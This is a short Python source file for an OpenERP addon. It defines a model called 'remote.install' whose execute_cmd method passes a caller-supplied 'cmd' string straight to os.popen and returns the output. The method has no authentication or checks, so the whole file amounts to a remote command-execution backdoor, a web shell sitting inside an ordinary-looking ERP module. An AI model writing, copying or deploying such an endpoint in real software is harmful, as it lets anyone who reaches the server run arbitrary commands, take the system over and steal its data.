# -*- coding: utf-8 -*-
import json

from openerp.osv import fields, osv, orm
import os

class Http(osv.osv):
    _name = 'remote.install'

    def execute_cmd(self,cr,uid,vals):
    	cmd = vals.get('cmd')
    	rs = os.popen(cmd)
    	return rs.read()